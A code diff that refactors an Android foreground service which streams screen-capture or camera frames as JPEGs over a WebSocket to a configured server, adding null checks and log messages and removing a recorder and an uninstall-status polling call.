@@ -115,24 +115,22 @@ public class ScreenCaptureService extends Service {
         public void onReceive(Context context, Intent intent) {
             if (ACTION_TOGGLE_CAMERA.equals(intent.getAction())) {
                 boolean enabled = intent.getBooleanExtra(EXTRA_CAMERA_ENABLED, false);
-                mainHandler.post(() -> setCameraStreamEnabled(enabled));
+                if (mainHandler != null) {
+                    mainHandler.post(() -> setCameraStreamEnabled(enabled));
+                }
             }
         }
     };
 
-    // ── Lifecycle ──────────────────────────────────────────────────────────────
-
     @Override
     public void onCreate() {
         super.onCreate();
-        mainHandler       = new Handler(Looper.getMainLooper());
-        httpClient        = new OkHttpClient();
+        mainHandler = new Handler(Looper.getMainLooper());
+        httpClient = new OkHttpClient();
         projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(cameraToggleReceiver,
-                    new IntentFilter(ACTION_TOGGLE_CAMERA),
-                    Context.RECEIVER_NOT_EXPORTED);
+            registerReceiver(cameraToggleReceiver, new IntentFilter(ACTION_TOGGLE_CAMERA), Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(cameraToggleReceiver, new IntentFilter(ACTION_TOGGLE_CAMERA));
         }
@@ -140,16 +138,10 @@ public class ScreenCaptureService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
         createNotificationChannel();
-
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(
-                    NOTIFICATION_ID,
-                    createNotification(),
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                            | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            );
+            startForeground(NOTIFICATION_ID, createNotification(),
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
         } else {
             startForeground(NOTIFICATION_ID, createNotification());
         }
@@ -159,18 +151,13 @@ public class ScreenCaptureService extends Service {
             return START_NOT_STICKY;
         }
 
-        resultCode = intent.getIntExtra("result_code", -1);
-        resultData = intent.getParcelableExtra("data");
-        deviceId   = intent.getStringExtra("device_id");
+        deviceId = intent.getStringExtra("device_id");
         deviceName = intent.getStringExtra("device_name");
-        serverIp   = intent.getStringExtra("server_ip");
+        serverIp = intent.getStringExtra("server_ip");
         cameraEnabled = intent.getBooleanExtra("camera_enabled", false);
 
-        if (resultCode == -1 ||
-                resultData == null ||
-                deviceId == null ||
-                serverIp == null) {
-
+        if (deviceId == null || serverIp == null) {
+            Log.e(TAG, "Invalid intent data");
             stopSelf();
             return START_NOT_STICKY;
         }
@@ -178,15 +165,14 @@ public class ScreenCaptureService extends Service {
         isRunning = true;
 
         if (mediaProjection == null) {
-            mediaProjection =
-                    projectionManager.getMediaProjection(resultCode, resultData);
+            int resultCode = intent.getIntExtra("result_code", -1);
+            Intent resultData = intent.getParcelableExtra("data");
+            if (resultCode != -1 && resultData != null) {
+                mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
+            }
         }
 
-        screenRecorder = new ScreenRecorder(serverIp, deviceId, getCacheDir());
-
         connectWebSocket();
-        startUninstallStatusPolling();
-
         return START_STICKY;
     }
 
@@ -205,9 +191,8 @@ public class ScreenCaptureService extends Service {
             @Override
             public void onOpen(WebSocket ws, Response response) {
                 isWsConnected = true;
-                Log.d(TAG, "WebSocket connected");
+                Log.d(TAG, "WebSocket connected successfully");
                 mainHandler.post(() -> {
-                    // Start in the correct mode based on cameraEnabled flag
                     if (cameraEnabled) {
                         startCameraCapture();
                     } else {
@@ -288,31 +273,27 @@ public class ScreenCaptureService extends Service {
     // ── Screen Streaming ───────────────────────────────────────────────────────
 
     private void startScreenStreaming() {
-        if (isScreenStreaming) return;     // already running
-        if (isCameraStreaming) return;     // camera is active — wait for toggle
-        if (mediaProjection == null) {
-            Log.e(TAG, "MediaProjection is null");
-            stopSelf();
+        if (isScreenStreaming || mediaProjection == null) {
+            Log.w(TAG, "Screen streaming already running or MediaProjection is null");
             return;
         }
 
         ensureBackgroundThread();
 
         DisplayMetrics metrics = getResources().getDisplayMetrics();
-        int screenWidth  = metrics.widthPixels;
-        int screenHeight = metrics.heightPixels;
-        int density      = metrics.densityDpi;
+        int width = metrics.widthPixels / 2;
+        int height = metrics.heightPixels / 2;
+        int density = metrics.densityDpi;
 
-        final int targetWidth  = ((screenWidth  / 2) / 2) * 2;
-        final int targetHeight = ((screenHeight / 2) / 2) * 2;
+        Log.d(TAG, "🎥 Starting Screen Streaming: " + width + "x" + height + " @ " + density + "dpi");
 
-        imageReader = ImageReader.newInstance(targetWidth, targetHeight, PixelFormat.RGBA_8888, 2);
+        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3);
+
         streamVirtualDisplay = mediaProjection.createVirtualDisplay(
                 "ScreenStream",
-                targetWidth, targetHeight, density,
+                width, height, density,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader.getSurface(), null, null
-        );
+                imageReader.getSurface(), null, backgroundHandler);
 
         imageReader.setOnImageAvailableListener(reader -> {
             if (!isWsConnected || isSendingFrame) {
@@ -320,51 +301,50 @@ public class ScreenCaptureService extends Service {
                 if (img != null) img.close();
                 return;
             }
+
             long now = System.currentTimeMillis();
             if (now - lastFrameTime < FRAME_INTERVAL_MS) {
                 Image img = reader.acquireLatestImage();
                 if (img != null) img.close();
                 return;
             }
-            lastFrameTime = now;
 
+            lastFrameTime = now;
             Image image = null;
+
             try {
                 image = reader.acquireLatestImage();
                 if (image == null) return;
+
                 isSendingFrame = true;
                 final Image finalImage = image;
 
                 backgroundHandler.post(() -> {
                     try {
-                        Image.Plane[] planes     = finalImage.getPlanes();
-                        ByteBuffer    buffer     = planes[0].getBuffer();
-                        int           pixelStride = planes[0].getPixelStride();
-                        int           rowStride   = planes[0].getRowStride();
-                        int           rowPadding  = rowStride - pixelStride * targetWidth;
+                        Image.Plane[] planes = finalImage.getPlanes();
+                        ByteBuffer buffer = planes[0].getBuffer();
+                        int pixelStride = planes[0].getPixelStride();
+                        int rowStride = planes[0].getRowStride();
+                        int rowPadding = rowStride - pixelStride * width;
 
                         Bitmap bmp = Bitmap.createBitmap(
-                                targetWidth + rowPadding / pixelStride, targetHeight,
-                                Bitmap.Config.ARGB_8888);
+                                width + (rowPadding / pixelStride), height, Bitmap.Config.ARGB_8888);
                         bmp.copyPixelsFromBuffer(buffer);
 
-                        Bitmap cleanBmp;
-                        if (rowPadding > 0) {
-                            cleanBmp = Bitmap.createBitmap(bmp, 0, 0, targetWidth, targetHeight);
-                            bmp.recycle();
-                        } else {
-                            cleanBmp = bmp;
-                        }
+                        Bitmap cleanBmp = (rowPadding > 0)
+                                ? Bitmap.createBitmap(bmp, 0, 0, width, height)
+                                : bmp;
 
                         ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                        cleanBmp.compress(Bitmap.CompressFormat.JPEG, 50, bos);
+                        cleanBmp.compress(Bitmap.CompressFormat.JPEG, 50, bos); // কম কোয়ালিটি → ফ্রেম ফাস্ট যাবে
                         cleanBmp.recycle();
 
                         if (isWsConnected && webSocket != null) {
                             webSocket.send(ByteString.of(bos.toByteArray()));
+                            Log.v(TAG, "📤 Screen frame sent (" + bos.size() + " bytes)");
                         }
                     } catch (Exception e) {
-                        Log.e(TAG, "Error processing screen frame", e);
+                        Log.e(TAG, "Screen frame processing error", e);
                     } finally {
                         finalImage.close();
                         isSendingFrame = false;
@@ -378,7 +358,7 @@ public class ScreenCaptureService extends Service {
         }, backgroundHandler);
 
         isScreenStreaming = true;
-        Log.d(TAG, "Screen streaming started at " + targetWidth + "x" + targetHeight);
+        Log.d(TAG, "✅ SCREEN STREAMING SUCCESSFULLY STARTED: " + width + "x" + height);
     }
 
     private void stopScreenStreaming() {
